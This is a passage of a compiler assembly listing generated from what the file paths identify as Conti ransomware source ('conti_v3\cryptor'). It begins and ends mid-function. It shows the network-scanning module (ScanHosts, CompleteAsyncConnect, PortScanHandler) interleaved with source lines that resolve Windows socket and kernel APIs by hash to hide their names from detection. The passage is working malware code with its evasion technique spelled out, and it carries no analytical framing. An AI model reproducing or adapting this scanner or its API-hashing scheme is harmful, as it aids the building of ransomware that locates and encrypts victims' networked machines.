; 443  : 	PCONNECT_CONTEXT ConnectCtx = NULL;
; 444  : 	TAILQ_FOREACH(ConnectCtx, &g_ConnectionList, Entries) {

  000bc	48 8b 5b 30	 mov	 rbx, QWORD PTR [rbx+48]
  000c0	48 85 db	 test	 rbx, rbx
  000c3	0f 85 77 ff ff
	ff		 jne	 $LL4@ScanHosts
  000c9	48 8b bc 24 80
	00 00 00	 mov	 rdi, QWORD PTR [rsp+128]
  000d1	48 8b 74 24 78	 mov	 rsi, QWORD PTR [rsp+120]
  000d6	48 8b 6c 24 70	 mov	 rbp, QWORD PTR [rsp+112]
$LN3@ScanHosts:

; 463  : 
; 464  : 		}
; 465  : 	}
; 466  : }

  000db	48 8b 4c 24 58	 mov	 rcx, QWORD PTR __$ArrayPad$[rsp]
  000e0	48 33 cc	 xor	 rcx, rsp
  000e3	e8 00 00 00 00	 call	 __security_check_cookie
  000e8	48 83 c4 60	 add	 rsp, 96			; 00000060H
  000ec	5b		 pop	 rbx
  000ed	c3		 ret	 0
?ScanHosts@@YAXXZ ENDP					; ScanHosts
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp
;	COMDAT ?CompleteAsyncConnect@@YAH_K@Z
_TEXT	SEGMENT
Bytes$ = 48
Seconds$ = 52
__$ArrayPad$ = 56
s$ = 80
?CompleteAsyncConnect@@YAH_K@Z PROC			; CompleteAsyncConnect, COMDAT

; 471  : {

$LN16:
  00000	48 89 5c 24 10	 mov	 QWORD PTR [rsp+16], rbx
  00005	57		 push	 rdi
  00006	48 83 ec 40	 sub	 rsp, 64			; 00000040H
  0000a	48 8b 05 00 00
	00 00		 mov	 rax, QWORD PTR __security_cookie
  00011	48 33 c4	 xor	 rax, rsp
  00014	48 89 44 24 38	 mov	 QWORD PTR __$ArrayPad$[rsp], rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 934  : 	pFunction = (int(WINAPI*)(SOCKET, int, int, const char*, int))getapi::GetProcAddressEx2(NULL, WS2_32_MODULE_ID, 0x33b7fed1, 30);//GetProcAddress(hWs2_32, OBFA("setsockopt"));

  00019	ba 15 00 00 00	 mov	 edx, 21
  0001e	41 b8 d1 fe b7
	33		 mov	 r8d, 867696337		; 33b7fed1H
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp

; 471  : {

  00024	48 8b f9	 mov	 rdi, rcx
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 934  : 	pFunction = (int(WINAPI*)(SOCKET, int, int, const char*, int))getapi::GetProcAddressEx2(NULL, WS2_32_MODULE_ID, 0x33b7fed1, 30);//GetProcAddress(hWs2_32, OBFA("setsockopt"));

  00027	44 8d 4a 09	 lea	 r9d, QWORD PTR [rdx+9]
  0002b	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 935  : 	return pFunction(s, level, optname, optval, optlen);

  00030	33 db		 xor	 ebx, ebx
  00032	45 33 c9	 xor	 r9d, r9d
  00035	ba ff ff 00 00	 mov	 edx, 65535		; 0000ffffH
  0003a	89 5c 24 20	 mov	 DWORD PTR [rsp+32], ebx
  0003e	41 b8 10 70 00
	00		 mov	 r8d, 28688		; 00007010H
  00044	48 8b cf	 mov	 rcx, rdi
  00047	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp

; 473  : 	if (Result != ERROR_SUCCESS)

  00049	85 c0		 test	 eax, eax
  0004b	75 49		 jne	 SHORT $LN10@CompleteAs
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 947  : 	pFunction = (int(WINAPI*)(SOCKET, int, int, char*, int*))getapi::GetProcAddressEx2(NULL, WS2_32_MODULE_ID, 0x1c5ed854, 29);//GetProcAddress(hWs2_32, OBFA("getsockopt"));

  0004d	8d 53 15	 lea	 edx, QWORD PTR [rbx+21]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp

; 477  : 	int Bytes = sizeof(Seconds);

  00050	c7 44 24 30 04
	00 00 00	 mov	 DWORD PTR Bytes$[rsp], 4
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 947  : 	pFunction = (int(WINAPI*)(SOCKET, int, int, char*, int*))getapi::GetProcAddressEx2(NULL, WS2_32_MODULE_ID, 0x1c5ed854, 29);//GetProcAddress(hWs2_32, OBFA("getsockopt"));

  00058	44 8d 4b 1d	 lea	 r9d, QWORD PTR [rbx+29]
  0005c	41 b8 54 d8 5e
	1c		 mov	 r8d, 475977812		; 1c5ed854H
  00062	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 948  : 	return pFunction(s, level, optname, optval, optlen);

  00067	48 8d 4c 24 30	 lea	 rcx, QWORD PTR Bytes$[rsp]
  0006c	ba ff ff 00 00	 mov	 edx, 65535		; 0000ffffH
  00071	48 89 4c 24 20	 mov	 QWORD PTR [rsp+32], rcx
  00076	4c 8d 4c 24 34	 lea	 r9, QWORD PTR Seconds$[rsp]
  0007b	48 8b cf	 mov	 rcx, rdi
  0007e	41 b8 0c 70 00
	00		 mov	 r8d, 28684		; 0000700cH
  00084	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp

; 479  : 	if (Result != ERROR_SUCCESS)

  00086	85 c0		 test	 eax, eax
  00088	75 0c		 jne	 SHORT $LN10@CompleteAs

; 480  : 		return FALSE;
; 481  : 
; 482  : 	if (Seconds == 0xFFFFFFFF)

  0008a	83 7c 24 34 ff	 cmp	 DWORD PTR Seconds$[rsp], -1 ; ffffffffH
  0008f	0f 95 c3	 setne	 bl
  00092	8b c3		 mov	 eax, ebx
  00094	eb 02		 jmp	 SHORT $LN1@CompleteAs
$LN10@CompleteAs:

; 483  : 		return FALSE;

  00096	33 c0		 xor	 eax, eax
$LN1@CompleteAs:

; 484  : 
; 485  : 	return TRUE;
; 486  : }

  00098	48 8b 4c 24 38	 mov	 rcx, QWORD PTR __$ArrayPad$[rsp]
  0009d	48 33 cc	 xor	 rcx, rsp
  000a0	e8 00 00 00 00	 call	 __security_check_cookie
  000a5	48 8b 5c 24 58	 mov	 rbx, QWORD PTR [rsp+88]
  000aa	48 83 c4 40	 add	 rsp, 64			; 00000040H
  000ae	5f		 pop	 rdi
  000af	c3		 ret	 0
?CompleteAsyncConnect@@YAH_K@Z ENDP			; CompleteAsyncConnect
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp
;	COMDAT ?TimerCallback@@YAXPEAXE@Z
_TEXT	SEGMENT
Arg$ = 48
TimerOrWaitFired$ = 56
?TimerCallback@@YAXPEAXE@Z PROC				; TimerCallback, COMDAT

; 491  : TimerCallback(PVOID Arg, BOOLEAN TimerOrWaitFired) {

$LN6:
  00000	40 53		 push	 rbx
  00002	48 83 ec 20	 sub	 rsp, 32			; 00000020H

; 492  : 	pPostQueuedCompletionStatus(g_IocpHandle, 0, TIMER_COMPLETION_KEY, NULL);

  00006	48 8b 1d 00 00
	00 00		 mov	 rbx, QWORD PTR ?g_IocpHandle@@3PEAXEA ; g_IocpHandle
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 458  : 	pFunction = (BOOL(WINAPI*)(HANDLE, DWORD, ULONG_PTR, LPOVERLAPPED))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x442d716b, 70);//GetProcAddress(hKernel32, OBFA("PostQueuedCompletionStatus"));

  0000d	ba 0f 00 00 00	 mov	 edx, 15
  00012	41 b8 6b 71 2d
	44		 mov	 r8d, 1143828843		; 442d716bH
  00018	44 8d 4a 37	 lea	 r9d, QWORD PTR [rdx+55]
  0001c	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 459  : 	return pFunction(CompletionPort, dwNumberOfBytesTransferred, dwCompletionKey, lpOverlapped);

  00021	45 33 c9	 xor	 r9d, r9d
  00024	33 d2		 xor	 edx, edx
  00026	48 8b cb	 mov	 rcx, rbx
  00029	45 8d 41 03	 lea	 r8d, QWORD PTR [r9+3]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp

; 493  : }

  0002d	48 83 c4 20	 add	 rsp, 32			; 00000020H
  00031	5b		 pop	 rbx
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 459  : 	return pFunction(CompletionPort, dwNumberOfBytesTransferred, dwCompletionKey, lpOverlapped);

  00032	48 ff e0	 rex_jmp rax
?TimerCallback@@YAXPEAXE@Z ENDP				; TimerCallback
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp
;	COMDAT ?PortScanHandler@@YAKPEAX@Z
_TEXT	SEGMENT
ConnectContext$2 = 64
hTimer$ = 72
Bytes$3 = 80
Seconds$4 = 84
dwBytesTransferred$5 = 88
CompletionStatus$6 = 96
__$ArrayPad$ = 104
pArg$ = 128
?PortScanHandler@@YAKPEAX@Z PROC			; PortScanHandler, COMDAT

; 499  : {

$LN156:
  00000	48 89 5c 24 08	 mov	 QWORD PTR [rsp+8], rbx
  00005	48 89 6c 24 10	 mov	 QWORD PTR [rsp+16], rbp
  0000a	48 89 74 24 18	 mov	 QWORD PTR [rsp+24], rsi
  0000f	48 89 7c 24 20	 mov	 QWORD PTR [rsp+32], rdi
  00014	41 56		 push	 r14
  00016	48 83 ec 70	 sub	 rsp, 112		; 00000070H
  0001a	48 8b 05 00 00
	00 00		 mov	 rax, QWORD PTR __security_cookie
  00021	48 33 c4	 xor	 rax, rsp
  00024	48 89 44 24 68	 mov	 QWORD PTR __$ArrayPad$[rsp], rax

; 500  : 	g_ActiveOperations = 0;

  00029	45 33 f6	 xor	 r14d, r14d
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 514  : 	pFunction = (HANDLE(WINAPI*)())getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x071a6760, 64);//GetProcAddress(hKernel32, OBFA("CreateTimerQueue"));

  0002c	41 b8 60 67 1a
	07		 mov	 r8d, 119170912		; 071a6760H
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp

; 500  : 	g_ActiveOperations = 0;

  00032	44 89 35 00 00
	00 00		 mov	 DWORD PTR ?g_ActiveOperations@@3JA, r14d ; g_ActiveOperations

; 501  : 	HANDLE hTimer = NULL;
; 502  : 	BOOL IsTimerActivated = FALSE;

  00039	41 8b f6	 mov	 esi, r14d
  0003c	4c 89 74 24 48	 mov	 QWORD PTR hTimer$[rsp], r14
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 514  : 	pFunction = (HANDLE(WINAPI*)())getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x071a6760, 64);//GetProcAddress(hKernel32, OBFA("CreateTimerQueue"));

  00041	41 8d 56 0f	 lea	 edx, QWORD PTR [r14+15]
  00045	45 8d 4e 40	 lea	 r9d, QWORD PTR [r14+64]
  00049	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 515  : 	return pFunction();

  0004e	ff d0		 call	 rax
  00050	48 8b e8	 mov	 rbp, rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp

; 505  : 	if (!hTimerQueue) {

  00053	48 85 c0	 test	 rax, rax
  00056	75 18		 jne	 SHORT $LL2@PortScanHa
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 445  : 	pFunction = (void(WINAPI*)(DWORD))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xa7be41e8, 71);//GetProcAddress(hKernel32, OBFA("ExitThread"));

  00058	8d 50 0f	 lea	 edx, QWORD PTR [rax+15]
  0005b	41 b8 e8 41 be
	a7		 mov	 r8d, -1480703512	; a7be41e8H
  00061	45 8d 4e 47	 lea	 r9d, QWORD PTR [r14+71]
  00065	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 446  : 	return pFunction(dwExitCode);

  0006a	8d 4d 01	 lea	 ecx, QWORD PTR [rbp+1]
  0006d	ff d0		 call	 rax
  0006f	90		 npad	 1
$LL2@PortScanHa:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp

; 515  : 		BOOL Success = (BOOL)pGetQueuedCompletionStatus(g_IocpHandle, &dwBytesTransferred, &CompletionStatus, (LPOVERLAPPED*)&ConnectContext, INFINITE);

  00070	48 8b 1d 00 00
	00 00		 mov	 rbx, QWORD PTR ?g_IocpHandle@@3PEAXEA ; g_IocpHandle
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 436  : 	pFunction = (BOOL(WINAPI*)(HANDLE, LPDWORD, PULONG_PTR, LPOVERLAPPED*, DWORD))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xa86380c7, 72);//GetProcAddress(hKernel32, OBFA("GetQueuedCompletionStatus"));

  00077	ba 0f 00 00 00	 mov	 edx, 15
  0007c	41 b8 c7 80 63
	a8		 mov	 r8d, -1469873977	; a86380c7H
  00082	44 8d 4a 39	 lea	 r9d, QWORD PTR [rdx+57]
  00086	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 437  : 	return pFunction(CompletionPort, lpNumberOfBytesTransferred, lpCompletionKey, lpOverlapped, dwMilliseconds);

  0008b	4c 8d 4c 24 40	 lea	 r9, QWORD PTR ConnectContext$2[rsp]
  00090	c7 44 24 20 ff
	ff ff ff	 mov	 DWORD PTR [rsp+32], -1	; ffffffffH
  00098	4c 8d 44 24 60	 lea	 r8, QWORD PTR CompletionStatus$6[rsp]
  0009d	48 8b cb	 mov	 rcx, rbx
  000a0	48 8d 54 24 58	 lea	 rdx, QWORD PTR dwBytesTransferred$5[rsp]
  000a5	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp

; 517  : 		if (CompletionStatus == START_COMPLETION_KEY) {

  000a7	48 8b 4c 24 60	 mov	 rcx, QWORD PTR CompletionStatus$6[rsp]
  000ac	48 83 f9 01	 cmp	 rcx, 1
  000b0	0f 84 67 01 00
	00		 je	 $LN5@PortScanHa

; 518  : 			
; 519  : 			if (!CreateHostTable()) {
; 520  : 				break;
; 521  : 			}
; 522  : 
; 523  : 			ScanHosts();
; 524  : 
; 525  : 			if (!pCreateTimerQueueTimer(&hTimer, hTimerQueue, &TimerCallback, NULL, 30000, 0, 0)) {
; 526  : 				pExitThread(EXIT_FAILURE);
; 527  : 			}
; 528  : 
; 529  : 			IsTimerActivated = FALSE;
; 530  : 
; 531  : 		} else if (CompletionStatus == CONNECT_COMPLETION_KEY) {

  000b6	48 83 f9 02	 cmp	 rcx, 2
  000ba	0f 85 d2 01 00
	00		 jne	 $LN22@PortScanHa

; 532  : 
; 533  : 			g_ActiveOperations--;

  000c0	ff 0d 00 00 00
	00		 dec	 DWORD PTR ?g_ActiveOperations@@3JA ; g_ActiveOperations

; 535  : 			if (Success && CompleteAsyncConnect(ConnectContext->s)) {

  000c6	85 c0		 test	 eax, eax
  000c8	0f 84 93 00 00
	00		 je	 $LN130@PortScanHa
  000ce	48 8b 44 24 40	 mov	 rax, QWORD PTR ConnectContext$2[rsp]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 934  : 	pFunction = (int(WINAPI*)(SOCKET, int, int, const char*, int))getapi::GetProcAddressEx2(NULL, WS2_32_MODULE_ID, 0x33b7fed1, 30);//GetProcAddress(hWs2_32, OBFA("setsockopt"));

  000d3	8d 51 13	 lea	 edx, QWORD PTR [rcx+19]
  000d6	44 8d 49 1c	 lea	 r9d, QWORD PTR [rcx+28]
  000da	41 b8 d1 fe b7
	33		 mov	 r8d, 867696337		; 33b7fed1H
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp

; 535  : 			if (Success && CompleteAsyncConnect(ConnectContext->s)) {

  000e0	48 8b 58 20	 mov	 rbx, QWORD PTR [rax+32]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 934  : 	pFunction = (int(WINAPI*)(SOCKET, int, int, const char*, int))getapi::GetProcAddressEx2(NULL, WS2_32_MODULE_ID, 0x33b7fed1, 30);//GetProcAddress(hWs2_32, OBFA("setsockopt"));

  000e4	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 935  : 	return pFunction(s, level, optname, optval, optlen);

  000e9	45 33 c9	 xor	 r9d, r9d
  000ec	44 89 74 24 20	 mov	 DWORD PTR [rsp+32], r14d
  000f1	ba ff ff 00 00	 mov	 edx, 65535		; 0000ffffH
  000f6	41 b8 10 70 00
	00		 mov	 r8d, 28688		; 00007010H
  000fc	48 8b cb	 mov	 rcx, rbx
  000ff	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp

; 473  : 	if (Result != ERROR_SUCCESS)

  00101	85 c0		 test	 eax, eax
  00103	75 5c		 jne	 SHORT $LN130@PortScanHa
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 947  : 	pFunction = (int(WINAPI*)(SOCKET, int, int, char*, int*))getapi::GetProcAddressEx2(NULL, WS2_32_MODULE_ID, 0x1c5ed854, 29);//GetProcAddress(hWs2_32, OBFA("getsockopt"));

  00105	8d 50 15	 lea	 edx, QWORD PTR [rax+21]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp

; 477  : 	int Bytes = sizeof(Seconds);

  00108	c7 44 24 50 04
	00 00 00	 mov	 DWORD PTR Bytes$3[rsp], 4
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 947  : 	pFunction = (int(WINAPI*)(SOCKET, int, int, char*, int*))getapi::GetProcAddressEx2(NULL, WS2_32_MODULE_ID, 0x1c5ed854, 29);//GetProcAddress(hWs2_32, OBFA("getsockopt"));

  00110	44 8d 48 1d	 lea	 r9d, QWORD PTR [rax+29]
  00114	41 b8 54 d8 5e
	1c		 mov	 r8d, 475977812		; 1c5ed854H
  0011a	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 948  : 	return pFunction(s, level, optname, optval, optlen);

  0011f	48 8d 4c 24 50	 lea	 rcx, QWORD PTR Bytes$3[rsp]
  00124	ba ff ff 00 00	 mov	 edx, 65535		; 0000ffffH
  00129	48 89 4c 24 20	 mov	 QWORD PTR [rsp+32], rcx
  0012e	4c 8d 4c 24 54	 lea	 r9, QWORD PTR Seconds$4[rsp]
  00133	48 8b cb	 mov	 rcx, rbx
  00136	41 b8 0c 70 00
	00		 mov	 r8d, 28684		; 0000700cH
  0013c	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp

; 479  : 	if (Result != ERROR_SUCCESS)

  0013e	85 c0		 test	 eax, eax
  00140	75 1f		 jne	 SHORT $LN130@PortScanHa

; 480  : 		return FALSE;
; 481  : 
; 482  : 	if (Seconds == 0xFFFFFFFF)

  00142	83 7c 24 54 ff	 cmp	 DWORD PTR Seconds$4[rsp], -1 ; ffffffffH
  00147	74 18		 je	 SHORT $LN130@PortScanHa

; 536  : 
; 537  : 				ConnectContext->State = CONNECTED;

  00149	48 8b 44 24 40	 mov	 rax, QWORD PTR ConnectContext$2[rsp]
  0014e	44 88 70 2c	 mov	 BYTE PTR [rax+44], r14b

; 538  : 				AddHost(ConnectContext->dwAddres);

  00152	48 8b 4c 24 40	 mov	 rcx, QWORD PTR ConnectContext$2[rsp]
  00157	8b 49 28	 mov	 ecx, DWORD PTR [rcx+40]
  0015a	e8 00 00 00 00	 call	 ?AddHost@@YAHK@Z	; AddHost

; 539  : 
; 540  : 			} else {

  0015f	eb 09		 jmp	 SHORT $LN25@PortScanHa
$LN130@PortScanHa:

; 541  : 
; 542  : 				ConnectContext->State = NOT_CONNECTED;

  00161	48 8b 44 24 40	 mov	 rax, QWORD PTR ConnectContext$2[rsp]
  00166	c6 40 2c 02	 mov	 BYTE PTR [rax+44], 2
$LN25@PortScanHa:

; 543  : 
; 544  : 			}
; 545  : 
; 546  : 			if (!g_ActiveOperations && IsTimerActivated) {

  0016a	44 39 35 00 00
	00 00		 cmp	 DWORD PTR ?g_ActiveOperations@@3JA, r14d ; g_ActiveOperations
  00171	0f 85 f9 fe ff
	ff		 jne	 $LL2@PortScanHa
  00177	85 f6		 test	 esi, esi
  00179	0f 84 f1 fe ff
	ff		 je	 $LL2@PortScanHa

; 548  : 				while (!TAILQ_EMPTY(&g_ConnectionList)) {

  0017f	48 8b 3d 00 00
	00 00		 mov	 rdi, QWORD PTR ?g_ConnectionList@@3Uconnection_list_@@A
  00186	48 85 ff	 test	 rdi, rdi
  00189	0f 84 8e 00 00
	00		 je	 $LN5@PortScanHa
  0018f	90		 npad	 1
$LL4@PortScanHa:

; 549  : 
; 550  : 					PCONNECT_CONTEXT ConnectCtx = TAILQ_FIRST(&g_ConnectionList);
; 551  : 					pshutdown(ConnectCtx->s, SD_SEND);

  00190	48 8b 5f 20	 mov	 rbx, QWORD PTR [rdi+32]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 957  : 	pFunction = (int(WINAPI*)(SOCKET, int))getapi::GetProcAddressEx2(NULL, WS2_32_MODULE_ID, 0x8f9390c3, 28);//GetProcAddress(hWs2_32, OBFA("shutdown"));

  00194	ba 15 00 00 00	 mov	 edx, 21
  00199	41 b8 c3 90 93
	8f		 mov	 r8d, -1886154557	; 8f9390c3H
  0019f	44 8d 4a 07	 lea	 r9d, QWORD PTR [rdx+7]
  001a3	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 958  : 	return pFunction(s, how);

  001a8	ba 01 00 00 00	 mov	 edx, 1
  001ad	48 8b cb	 mov	 rcx, rbx
  001b0	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp

; 552  : 					pclosesocket(ConnectCtx->s);

  001b2	48 8b 5f 20	 mov	 rbx, QWORD PTR [rdi+32]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 883  : 	pFunction = (int(WINAPI*)(SOCKET))getapi::GetProcAddressEx2(NULL, WS2_32_MODULE_ID, 0x3e3c66ba, 34);//GetProcAddress(hWs2_32, OBFA("closesocket"));

  001b6	ba 15 00 00 00	 mov	 edx, 21
  001bb	41 b8 ba 66 3c
	3e		 mov	 r8d, 1044145850		; 3e3c66baH
  001c1	44 8d 4a 0d	 lea	 r9d, QWORD PTR [rdx+13]
  001c5	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 884  : 	return pFunction(s);

  001ca	48 8b cb	 mov	 rcx, rbx
  001cd	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp

; 553  : 					TAILQ_REMOVE(&g_ConnectionList, ConnectCtx, Entries);

  001cf	48 8b 4f 30	 mov	 rcx, QWORD PTR [rdi+48]
  001d3	48 8b 47 38	 mov	 rax, QWORD PTR [rdi+56]
  001d7	48 85 c9	 test	 rcx, rcx
  001da	74 06		 je	 SHORT $LN27@PortScanHa
  001dc	48 89 41 38	 mov	 QWORD PTR [rcx+56], rax
  001e0	eb 07		 jmp	 SHORT $LN28@PortScanHa
$LN27@PortScanHa:
  001e2	48 89 05 08 00
	00 00		 mov	 QWORD PTR ?g_ConnectionList@@3Uconnection_list_@@A+8, rax
$LN28@PortScanHa:
  001e9	48 8b 57 38	 mov	 rdx, QWORD PTR [rdi+56]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 486  : 	pFunction = (HGLOBAL(WINAPI*)(HGLOBAL))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x8d87ce2b, 67);//GetProcAddress(hKernel32, OBFA("GlobalFree"));

  001ed	41 b8 2b ce 87
	8d		 mov	 r8d, -1920479701	; 8d87ce2bH
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp

; 553  : 					TAILQ_REMOVE(&g_ConnectionList, ConnectCtx, Entries);

  001f3	48 8b 47 30	 mov	 rax, QWORD PTR [rdi+48]
  001f7	48 89 02	 mov	 QWORD PTR [rdx], rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

